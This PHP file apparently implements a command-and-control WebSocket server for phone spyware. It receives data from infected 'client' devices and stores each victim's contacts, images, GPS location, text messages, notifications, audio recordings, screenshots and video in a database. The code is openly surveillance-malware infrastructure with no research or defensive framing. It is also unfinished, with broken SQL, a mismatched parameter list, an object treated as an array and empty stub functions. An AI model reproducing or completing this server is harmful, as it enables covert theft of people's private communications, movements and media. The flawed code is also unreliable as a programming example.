<?php

namespace C2;

use Ratchet\ConnectionInterface;
use Ratchet\RFC6455\Messaging\MessageInterface;
use Ratchet\WebSocket\MessageComponentInterface;

class C2WebSocket implements MessageComponentInterface {

    protected $clients;

    /** @var Database $database Database instance */
    private Database $database;

    public function __construct(Database $database)
    {
        $this->clients = new \SplObjectStorage();
        $this->database = $database;
    }

    public function onOpen(ConnectionInterface $conn)
    {
        $this->clients->attach($conn);
    }

    public function onMessage(ConnectionInterface $conn, MessageInterface $msg)
    {
        $data = json_decode($msg->getContents());
        var_dump($msg);

        if ($data['type'] === 'client')
            $this->clientConnection($conn, $data);
        

        if ($data['type'] === 'server')
            $this->serverConnection($conn, $data);
    }

    public function onClose(ConnectionInterface $conn)
    {
        var_dump($conn);
        $this->clients->detach($conn);
    }

    public function onError(ConnectionInterface $conn, \Exception $e)
    {
        $conn->close();
    }

    /**
     * Handle client connections
     * 
     * @param ConnectionInterface $conn
     * @param array $data
     */
    private function clientConnection(ConnectionInterface $conn, array $data): void
    {
        $clientID = $data['id'];

        switch ($data['res']) {
            case "contact":
                $query = "INSERT INTO CONTACT(client_id, name, number) VALUES(?, ?, ?)";
                $name = base64_decode($data['name']);
                $number = base64_decode($data['number']);
                $this->database->insert($query, [$clientID, $name, $number]);
                break;
            case "image":
                $query = "INSERT INTO IMAGE(client_id, filename, timestamp) VALUES(?, ?, ?)";
                $filename = base64_decode($data['filename']);
                $timestamp = $data['timestamp'];
                $this->database->insert($query, [$clientID, $filename, $timestamp]);
                break;
            case "location":
                $query = "INSERT INTO LOCATION(client_id, latitude, longitude altitude) VALUES(?, ?, ?, ?)";
                $latitude = base64_decode($data['latitude']);
                $longitude = base64_decode($data['longitude']);
                $altitude = base64_decode($data['altitude']);
                $this->database->insert($query, [$clientID, $latitude, $longitude, $altitude]);
                break;
            case "message":
                $query = "INSERT INTO MESSAGE(client_id, sender, content, timestamp) VALUES(?, ?, ?, ?)";
                $sender = base64_decode($data['sender']);
                $content = base64_decode($data['content']);
                $timestamp = $data['timestamp'];
                $this->database->insert($query, [$sender, $content, $timestamp]);
                break;
            case "notification":
                $query = "INSERT INTO NOTIFICATION(client_id, sender, content, timestamp) VALUES(?, ?, ?, ?)";
                $sender = base64_decode($data['sender']);
                $content = base64_decode($data['content']);
                $timestamp = $data['timestamp'];
                $this->database->insert($query, [$clientID, $sender, $content, $timestamp]);
                break;
            case "recording":
                $query = "INSERT INTO RECORDING(client_id, filename, timestamp) VALUES(?, ?, ?)";
                $filename = base64_decode($data['filename']);
                $timestamp = $data['timestamp'];
                $this->database->insert($query, [$clientID, $filename, $timestamp]);
                break;
            case "screesnshot":
                $query = "INSERT INTO SCREENSHOT(client_id, filename, timestamp) VALUES(?, ?, ?)";
                $filename = base64_decode($data['filename']);
                $timestamp = $data['timestamp'];
                $this->database->insert($query, [$clientID, $filename, $timestamp]);
                break;
            case "video":
                $query = "INSERT INTO VIDEO(client_id, filename, timestamp) VALUES(?, ?, ?)";
                $filename = base64_decode($data['filename']);
                $timestamp = $data['timestamp'];
                $this->database->insert($query, [$clientID, $filename, $timestamp]);
                break;
            default:
                break;
        }
    }

    /**
     * Handle connections from the server
     * 
     * @param ConnectionInterface $conn
     * @param array $data
     */
    private function serverConnection(ConnectionInterface $conn, array $data): void
    {
        $clientWebSocketID = $data['web_socket_id'];

        if ($this->isClientConnected($clientWebSocketID)) {

        }
    }

    /**
     * Check if a particular client is connected
     * 
     * @param int $webSocketConnectionID
     * 
     * @return bool
     */
    private function isClientConnected(int $webSocketConnectionID): bool
    {
        foreach ($this->clients as $client) {
            if ($client->getId() === $webSocketConnectionID)
                return true;
        }

        return false;
    }

    private function updateClientWebSocketIDinDatabase(): void
    {
        
    }
}
